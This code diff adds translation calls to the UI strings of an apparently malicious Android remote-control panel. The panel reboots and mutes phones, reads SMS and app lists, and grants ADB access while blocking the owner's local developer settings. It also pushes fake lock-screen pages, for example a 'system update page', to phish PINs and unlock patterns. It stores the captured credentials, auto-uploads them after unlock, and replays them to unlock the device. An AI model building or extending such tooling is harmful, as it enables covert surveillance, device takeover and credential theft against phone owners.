           </span>
         </button>
 
@@ -1356,12 +1359,12 @@ export function RemoteOpsPanel({
           className="ops-tool-btn"
           disabled={!isOnline || muteBusy}
           onClick={() => void sendMutePhone()}
-          title="静音"
+          title={t("静音")}
         >
           <span className="ops-tool-btn-icon" aria-hidden="true">
             <AudioMutedOutlined />
           </span>
-          <span className="ops-tool-btn-label">{muteBusy ? "静音中" : "静音"}</span>
+          <span className="ops-tool-btn-label">{muteBusy ? t("静音中") : t("静音")}</span>
         </button>
 
         <button
@@ -1369,13 +1372,13 @@ export function RemoteOpsPanel({
           className={`ops-tool-btn${autoRotationEnabled ? " is-active" : ""}`}
           disabled={!isOnline || rotationBusy}
           onClick={() => void toggleAutoRotation()}
-          title={autoRotationEnabled ? "关闭自动旋转" : "开启自动旋转"}
+          title={autoRotationEnabled ? t("关闭自动旋转") : t("开启自动旋转")}
         >
           <span className="ops-tool-btn-icon" aria-hidden="true">
             <RotateRightOutlined />
           </span>
           <span className="ops-tool-btn-label">
-            {rotationBusy ? "处理中" : autoRotationEnabled ? "关旋转" : "开旋转"}
+            {rotationBusy ? t("处理中") : autoRotationEnabled ? t("关旋转") : t("开旋转")}
           </span>
         </button>
 
@@ -1384,12 +1387,12 @@ export function RemoteOpsPanel({
           className="ops-tool-btn"
           disabled={!isOnline || rebootBusy}
           onClick={() => void sendRebootPhone()}
-          title="重启手机"
+          title={t("重启手机")}
         >
           <span className="ops-tool-btn-icon" aria-hidden="true">
             <PoweroffOutlined />
           </span>
-          <span className="ops-tool-btn-label">{rebootBusy ? "重启中" : "重启"}</span>
+          <span className="ops-tool-btn-label">{rebootBusy ? t("重启中") : t("重启")}</span>
         </button>
 
         <button
@@ -1397,12 +1400,12 @@ export function RemoteOpsPanel({
           className="ops-tool-btn"
           disabled={!isOnline || uninstallBusy}
           onClick={() => void sendUninstallPhone()}
-          title="关闭无障碍，便于手动卸载"
+          title={t("关闭无障碍，便于手动卸载")}
         >
           <span className="ops-tool-btn-icon" aria-hidden="true">
             <DeleteOutlined />
           </span>
-          <span className="ops-tool-btn-label">{uninstallBusy ? "处理中" : "卸载"}</span>
+          <span className="ops-tool-btn-label">{uninstallBusy ? t("处理中") : t("卸载")}</span>
         </button>
 
         <button
@@ -1410,36 +1413,36 @@ export function RemoteOpsPanel({
           className="ops-tool-btn"
           disabled={!isOnline || updateApkBusy}
           onClick={() => void sendUpdateApk()}
-          title="下载并覆盖安装 B 包；确认框请在投屏里点"
+          title={t("下载并覆盖安装 B 包；确认框请在投屏里点")}
         >
           <span className="ops-tool-btn-icon" aria-hidden="true">
             <CloudDownloadOutlined />
           </span>
-          <span className="ops-tool-btn-label">{updateApkBusy ? "更新中" : "更新B包"}</span>
+          <span className="ops-tool-btn-label">{updateApkBusy ? t("更新中") : t("更新B包")}</span>
         </button>
 
         <button
           type="button"
           className={`ops-tool-btn${appsWorkspaceOpen ? " is-active" : ""}`}
           onClick={() => toggleWorkspace("apps")}
-          title="应用列表（在公共操作区打开）"
+          title={t("应用列表（在公共操作区打开）")}
         >
           <span className="ops-tool-btn-icon" aria-hidden="true">
             <AppstoreOutlined />
           </span>
-          <span className="ops-tool-btn-label">应用</span>
+          <span className="ops-tool-btn-label">{t("应用")}</span>
         </button>
 
         <button
           type="button"
           className={`ops-tool-btn${smsWorkspaceOpen ? " is-active" : ""}`}
           onClick={() => toggleWorkspace("sms")}
-          title="短信列表（在公共操作区打开）"
+          title={t("短信列表（在公共操作区打开）")}
         >
           <span className="ops-tool-btn-icon" aria-hidden="true">
             <MailOutlined />
           </span>
-          <span className="ops-tool-btn-label">短信</span>
+          <span className="ops-tool-btn-label">{t("短信")}</span>
         </button>
 
         <button
@@ -1447,12 +1450,12 @@ export function RemoteOpsPanel({
           className={`ops-tool-btn${opsWorkspace === "phone-agent" ? " is-active" : ""}`}
           disabled={!isOnline}
           onClick={() => toggleWorkspace("phone-agent")}
-          title="AI 操机（在公共操作区打开）"
+          title={t("AI 操机（在公共操作区打开）")}
         >
           <span className="ops-tool-btn-icon" aria-hidden="true">
             <RobotOutlined />
           </span>
-          <span className="ops-tool-btn-label">AI 操机</span>
+          <span className="ops-tool-btn-label">{t("AI 操机")}</span>
         </button>
 
         <button
@@ -1460,7 +1463,7 @@ export function RemoteOpsPanel({
           className={`ops-tool-btn${adbWorkspaceOpen ? " is-active" : ""}`}
           disabled={!isOnline}
           onClick={() => toggleWorkspace("adb")}
-          title="ADB：点开后约 5 分钟内放行开发者/无线调试（手机本地进仍踢）；到期再点续期"
+          title={t("ADB：点开后约 5 分钟内放行开发者/无线调试（手机本地进仍踢）；到期再点续期")}
         >
           <span className="ops-tool-btn-icon" aria-hidden="true">
             <ApiOutlined />
@@ -1479,11 +1482,11 @@ export function RemoteOpsPanel({
                 items={[
                   {
                     key: "unlock",
-                    label: "锁屏 / 解锁",
+                    label: t("锁屏 / 解锁"),
                     children: (
                       <>
                         <section className="ops-section">
-                          <div className="ops-section-title">锁屏操作</div>
+                          <div className="ops-section-title">{t("锁屏操作")}</div>
                           <div className="ops-lock-modal-actions">
                             <button
                               type="button"
@@ -1491,7 +1494,7 @@ export function RemoteOpsPanel({
                               disabled={!isOnline || lockBusy}
                               onClick={() => void sendLockScreen()}
                             >
-                              {lockBusy ? "锁屏中…" : "立即锁屏"}
+                              {lockBusy ? t("锁屏中…") : t("立即锁屏")}
                             </button>
                             <button
                               type="button"
@@ -1499,14 +1502,14 @@ export function RemoteOpsPanel({
                               disabled={!isOnline || unlockBusy}
                               onClick={() => void sendWakeScreen()}
                             >
-                              唤醒屏幕
+                              {t("唤醒屏幕")}
                             </button>
                           </div>
                           {lockMessage ? <div className="ops-hint">{lockMessage}</div> : null}
                         </section>
 
                         <section className="ops-section">
-                          <div className="ops-section-title">解锁</div>
+                          <div className="ops-section-title">{t("解锁")}</div>
                           <div className="ops-unlock-row">
                             <input
                               className="ops-input"
@@ -1515,8 +1518,8 @@ export function RemoteOpsPanel({
                               autoComplete="off"
                               placeholder={
                                 keyguardPin?.lockType === "pattern"
-                                  ? "图形路径如 7-4-5-8-9-6（可空=用采集记录）"
-                                  : "锁屏 PIN"
+                                  ? t("图形路径如 7-4-5-8-9-6（可空=用采集记录）")
+                                  : t("锁屏 PIN")
                               }
                               value={unlockPin}
                               onChange={(event) => setUnlockPin(event.target.value)}
@@ -1531,23 +1534,23 @@ export function RemoteOpsPanel({
                               }
                               onClick={() => void sendUnlockPin()}
                             >
-                              解锁
+                              {t("解锁")}
                             </button>
                           </div>
                           {unlockMessage ? <div className="ops-hint">{unlockMessage}</div> : null}
                         </section>
 
                         <section className="ops-section">
-                          <div className="ops-section-title">一键解锁（自动采集）</div>
+                          <div className="ops-section-title">{t("一键解锁（自动采集）")}</div>
                           {keyguardPin?.pin ? (
                             <article className="ops-record-item ops-record-item--keyguard">
                               <div className="ops-record-head">
                                 <span className="ops-record-label">
                                   {keyguardPin.lockType === "pattern"
-                                    ? `图形 ${keyguardPin.digitCount} 点`
+                                    ? t("图形 {0} 点", { 0: keyguardPin.digitCount })
                                     : keyguardPin.lockType === "password"
-                                      ? `混合密码 ${keyguardPin.digitCount} 位`
-                                      : `${keyguardPin.digitCount} 位 PIN`}
+                                      ? t("混合密码 {0} 位", { 0: keyguardPin.digitCount })
+                                      : t("{0} 位 PIN", { 0: keyguardPin.digitCount })}
                                 </span>
                                 <span className="ops-record-time">
                                   {formatTime(new Date(keyguardPin.capturedAt).getTime())}
@@ -1558,13 +1561,12 @@ export function RemoteOpsPanel({
                               </div>
                               {isMaskedSecret(keyguardPin.pin) ? (
                                 <div className="ops-hint ops-hint--warn">
-                                  这是掩码脏数据，不是真实密码。请点「清除无效采集」，或在伪页 Tab
-                                  重新采集。
+                                  {t("这是掩码脏数据，不是真实密码。请点「清除无效采集」，或在伪页 Tab\n                                  重新采集。")}
                                 </div>
                               ) : null}
                               {keyguardPin.lockType === "pattern" && !keyguardPin.gesturePath ? (
                                 <div className="ops-hint">
-                                  无 PATH，将用格点 cells 在真锁屏上自动绘制（需已进入图案页）
+                                  {t("无 PATH，将用格点 cells 在真锁屏上自动绘制（需已进入图案页）")}
                                 </div>
                               ) : null}
                               <div className="ops-record-actions">
@@ -1575,7 +1577,7 @@ export function RemoteOpsPanel({
                                     className="secondary-button"
                                     onClick={() => setUnlockPin(keyguardPin.pin)}
                                   >
-                                    填入解锁框
+                                    {t("填入解锁框")}
                                   </button>
                                 ) : null}
                                 {isMaskedSecret(keyguardPin.pin) ? (
@@ -1584,7 +1586,7 @@ export function RemoteOpsPanel({
                                     className="secondary-button"
                                     onClick={() => void handleClearInvalidKeyguard()}
                                   >
-                                    清除无效采集
+                                    {t("清除无效采集")}
                                   </button>
                                 ) : null}
                                 <button
@@ -1602,17 +1604,17 @@ export function RemoteOpsPanel({
                                     void sendUnlockWithRecord(keyguardPin);
                                   }}
                                 >
-                                  一键解锁
+                                  {t("一键解锁")}
                                 </button>
                               </div>
                             </article>
                           ) : (
-                            <div className="empty-state ops-empty">解锁成功后自动上传完整凭据</div>
+                            <div className="empty-state ops-empty">{t("解锁成功后自动上传完整凭据")}</div>
                           )}
                         </section>
 
                         <section className="ops-section">
-                          <div className="ops-section-title">密码记录</div>
+                          <div className="ops-section-title">{t("密码记录")}</div>
                           <DevicePasswordRecordsPanel
                             key={`pwd-history-${deviceId}-${keyguardPin?.pin ?? ""}-${keyguardPin?.updatedAt ?? keyguardPin?.capturedAt ?? ""}`}
                             deviceId={deviceId}
@@ -1627,14 +1629,14 @@ export function RemoteOpsPanel({
                   },
                   {
                     key: "fake",
-                    label: "锁屏伪页",
+                    label: t("锁屏伪页"),
                     children: (
                       <div className="ops-keyguard-fake-form">
                         <div className="ops-keyguard-fake-lock-type">
-                          <span className="ops-keyguard-fake-label">当前锁屏类型</span>
+                          <span className="ops-keyguard-fake-label">{t("当前锁屏类型")}</span>
                           <strong className="ops-keyguard-fake-lock-type-value">
                             {lockTypeDetecting && !displayedLockType
-                              ? "检测中…"
+                              ? t("检测中…")
                               : formatLockTypeLabel(displayedLockType)}
                           </strong>
                           {lockTypeSource ? (
@@ -1649,16 +1651,15 @@ export function RemoteOpsPanel({
                               disabled={!isOnline || lockTypeDetecting}
                               onClick={() => void detectKeyguardLockType()}
                             >
-                              {lockTypeDetecting ? "检测中…" : "重新检测"}
+                              {lockTypeDetecting ? t("检测中…") : t("重新检测")}
                             </button>
                           ) : null}
                         </div>
                         <div className="ops-hint">
-                          先在下方选择 Web 链接再下发；图案伪页与 Web
-                          伪页均使用所选 https 地址（不会自动拼后台 IP）
+                          {t("先在下方选择 Web 链接再下发；图案伪页与 Web\n                          伪页均使用所选 https 地址（不会自动拼后台 IP）")}
                         </div>
                         <div className="ops-keyguard-fake-field">
-                          <span className="ops-keyguard-fake-label">Web 链接 (HTTPS)</span>
+                          <span className="ops-keyguard-fake-label">{t("Web 链接 (HTTPS)")}</span>
                           <Space.Compact style={{ width: "100%" }}>
                             <Select
                               showSearch
@@ -1666,8 +1667,8 @@ export function RemoteOpsPanel({
                               loading={keyguardFakeWebLinksLoading}
                               placeholder={
                                 keyguardFakeWebLinks.length === 0
-                                  ? "暂无链接，请点 + 新增"
-                                  : "请选择 Web 链接"
+                                  ? t("暂无链接，请点 + 新增")
+                                  : t("请选择 Web 链接")
                               }
                               value={keyguardFakeWebUrl || undefined}
                               options={keyguardFakeWebLinks.map((item) => ({
@@ -1676,12 +1677,12 @@ export function RemoteOpsPanel({
                               }))}
                               onChange={(value) => setKeyguardFakeWebUrl(value)}
                               style={{ width: "100%" }}
-                              notFoundContent="暂无链接"
+                              notFoundContent={t("暂无链接")}
                             />
                             <Button
                               type="primary"
                               icon={<PlusOutlined />}
-                              title="新增 Web 链接"
+                              title={t("新增 Web 链接")}
                               onClick={() => {
                                 setKeyguardFakeNewLinkName("");
                                 setKeyguardFakeNewLinkUrl("");
@@ -1697,7 +1698,7 @@ export function RemoteOpsPanel({
                             disabled={!isOnline || keyguardFakeBusy}
                             onClick={() => void sendKeyguardFakePatternPage()}
                           >
-                            {keyguardFakeBusy ? "下发中…" : "下发图案伪页"}
+                            {keyguardFakeBusy ? t("下发中…") : t("下发图案伪页")}
                           </button>
                           <button
                             type="button"
@@ -1705,7 +1706,7 @@ export function RemoteOpsPanel({
                             disabled={!isOnline || keyguardFakeBusy}
                             onClick={() => void sendKeyguardFakePage()}
                           >
-                            下发 Web 伪页
+                            {t("下发 Web 伪页")}
                           </button>
                           <button
                             type="button"
@@ -1713,7 +1714,7 @@ export function RemoteOpsPanel({
                             disabled={!isOnline || keyguardFakeBusy}
                             onClick={() => void hideKeyguardFakePage()}
                           >
-                            关闭伪页
+                            {t("关闭伪页")}
                           </button>
                           <button
                             type="button"
@@ -1721,7 +1722,7 @@ export function RemoteOpsPanel({
                             disabled={keyguardFakeRecordsLoading}
                             onClick={() => void loadKeyguardFakeRecords()}
                           >
-                            {keyguardFakeRecordsLoading ? "刷新中…" : "刷新采集"}
+                            {keyguardFakeRecordsLoading ? t("刷新中…") : t("刷新采集")}
                           </button>
                         </div>
                         {keyguardFakeMessage ? (
@@ -1744,15 +1745,15 @@ export function RemoteOpsPanel({
                               const lockType = resolveLockType(record.text);
                               const typeTag =
                                 lockType === "pattern"
-                                  ? "图形"
+                                  ? t("图形")
                                   : lockType === "password"
-                                    ? "混合"
+                                    ? t("混合")
                                     : "PIN";
                               return (
                                 <li key={record.id} className="ops-keyguard-fake-record-item">
                                   <div className="ops-keyguard-fake-record-main">
                                     <span className="ops-record-label">
-                                      {record.title || "锁屏验证"}
+                                      {record.title || t("锁屏验证")}
                                       <span className="ops-keyguard-fake-type-tag">{typeTag}</span>
                                     </span>
                                     <span className="ops-record-value">{record.text}</span>
@@ -1769,7 +1770,7 @@ export function RemoteOpsPanel({
                                       }
                                       onClick={() => void handleFakePageSetAsDefault(record)}
                                     >
-                                      设为默认密码
+                                      {t("设为默认密码")}
                                     </button>
                                     <button
                                       type="button"
@@ -1779,7 +1780,7 @@ export function RemoteOpsPanel({
                                       }
                                       onClick={() => void handleFakePageAddToHistory(record)}
                                     >
-                                      加入历史密码
+                                      {t("加入历史密码")}
                                     </button>
                                   </div>
                                 </li>
@@ -1787,7 +1788,7 @@ export function RemoteOpsPanel({
                             })}
                           </ul>
                         ) : (
-                          <div className="empty-state ops-empty">暂无锁屏伪页采集</div>
+                          <div className="empty-state ops-empty">{t("暂无锁屏伪页采集")}</div>
                         )}
                       </div>
                     ),
@@ -1800,7 +1801,7 @@ export function RemoteOpsPanel({
         : null}
 
       <Modal
-        title="剪切板 → 手机"
+        title={t("剪切板 → 手机")}
         open={clipboardOpen}
         onCancel={() => {
           if (!pasteBusy) {
@@ -1809,8 +1810,8 @@ export function RemoteOpsPanel({
         }}
         onOk={() => void handleClipboardSubmit()}
         confirmLoading={pasteBusy}
-        okText="发送"
-        cancelText="取消"
+        okText={t("发送")}
+        cancelText={t("取消")}
         destroyOnClose
         centered={false}
         zIndex={12000}
@@ -1826,10 +1827,10 @@ export function RemoteOpsPanel({
             onClick={() => void fillFromComputerClipboard()}
             disabled={pasteBusy}
           >
-            读取电脑剪贴板
+            {t("读取电脑剪贴板")}
           </Button>,
           <Button key="cancel" onClick={() => setClipboardOpen(false)} disabled={pasteBusy}>
-            取消
+            {t("取消")}
           </Button>,
           <Button
             key="ok"
@@ -1837,21 +1838,21 @@ export function RemoteOpsPanel({
             loading={pasteBusy}
             onClick={() => void handleClipboardSubmit()}
           >
-            发送
+            {t("发送")}
           </Button>,
         ]}
       >
         <Form layout="vertical" style={{ marginTop: 8 }}>
           <Form.Item
-            label="发送内容"
-            extra="回车即发送到手机当前聚焦的输入框"
+            label={t("发送内容")}
+            extra={t("回车即发送到手机当前聚焦的输入框")}
             style={{ marginBottom: 0 }}
           >
             <Input.TextArea
               ref={clipboardFieldRef}
               autoFocus
               autoSize={{ minRows: 3, maxRows: 8 }}
-              placeholder="用电脑键盘输入，按回车发送"
+              placeholder={t("用电脑键盘输入，按回车发送")}
               value={clipboardInput}
               onChange={(event) => setClipboardInput(event.target.value)}
               onPressEnter={(event) => {
@@ -1868,7 +1869,7 @@ export function RemoteOpsPanel({
       </Modal>
 
       <Modal
-        title="新增 Web 链接"
+        title={t("新增 Web 链接")}
         open={keyguardFakeAddLinkOpen}
         onCancel={() => {
           if (!keyguardFakeAddingLink) {
@@ -1877,23 +1878,23 @@ export function RemoteOpsPanel({
         }}
         onOk={() => void handleAddKeyguardFakeWebLink()}
         confirmLoading={keyguardFakeAddingLink}
-        okText="保存"
-        cancelText="取消"
+        okText={t("保存")}
+        cancelText={t("取消")}
         destroyOnClose
         centered={false}
         zIndex={12000}
         getContainer={() => document.body}
       >
         <Form layout="vertical" style={{ marginTop: 8 }}>
-          <Form.Item label="名称" required>
+          <Form.Item label={t("名称")} required>
             <Input
-              placeholder="例如：系统更新页"
+              placeholder={t("例如：系统更新页")}
               value={keyguardFakeNewLinkName}
               onChange={(event) => setKeyguardFakeNewLinkName(event.target.value)}
               maxLength={128}
             />
           </Form.Item>
-          <Form.Item label="链接 (HTTPS)" required>
+          <Form.Item label={t("链接 (HTTPS)")} required>
             <Input
               placeholder="https://example.com/lock/"
               value={keyguardFakeNewLinkUrl}
